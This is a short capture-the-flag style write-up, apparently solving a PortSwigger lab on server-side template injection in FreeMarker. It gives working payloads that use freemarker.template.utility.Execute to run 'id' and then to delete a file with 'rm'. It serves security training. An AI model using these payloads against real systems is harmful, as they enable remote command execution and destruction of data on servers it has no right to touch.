# Server-side template injection using documentation
Lab URL :- 

`https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation`

![image](https://user-images.githubusercontent.com/60841283/153761363-fc4910a6-da85-4886-9fac-0b732c7a6519.png)

## Identifying the template
Login into account and edit one of the templates

![image](https://user-images.githubusercontent.com/60841283/153760397-128edca0-a091-43f5-841c-293de023da83.png)

Change it to something else and save it.

![image](https://user-images.githubusercontent.com/60841283/153760439-72a7f003-8e45-47d9-a208-373664ea1996.png)

Template --> freemarker.

Blog post for reference exploitation

`https://www.synacktiv.com/en/publications/exploiting-cve-2021-25770-a-server-side-template-injection-in-youtrack.html`

Payload
```html
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}
```

![image](https://user-images.githubusercontent.com/60841283/153761232-56df116a-ee59-451c-b03c-c905a288212b.png)

![image](https://user-images.githubusercontent.com/60841283/153761199-708f9a33-cf6d-465c-ab9a-6fee49139573.png)

Delete the file
```html
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("rm /home/carlos/morale.txt")}
```

![image](https://user-images.githubusercontent.com/60841283/153761276-2a85c8e9-3ce7-4c3f-a278-59664218636b.png)

Save and file gets deleted.

![image](https://user-images.githubusercontent.com/60841283/153761299-df5e62ae-390b-4597-9a34-3617d1df5bc3.png)
